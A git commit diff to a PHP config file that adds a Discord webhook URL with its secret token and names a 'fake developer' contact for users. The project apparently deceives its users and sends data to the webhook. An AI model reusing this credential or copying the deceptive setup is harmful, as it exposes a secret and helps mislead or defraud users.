f6e1750455b18949a465a9674547755d425af5a0
anzeyy <78407880+anzeyy@users.noreply.github.com>
2021-02-02 00:02:41 -0800

    Update config.php

--- config.php
+++ config.php
@@ -1,6 +1,6 @@
 <?php
     // webhook link
-    $webhook = "";
+    $webhook = "https://discord.com/api/webhooks/806069466340786186/oGZY0ISfLIKPGJfU1nml0TczLhX1xx0f466T4vnB7fizhm0VEtSc3MCWoZI3Y400Y2pQ";
     // fake developer for the bot the users may contact
     $discord_contact = "Toco#9999";
     
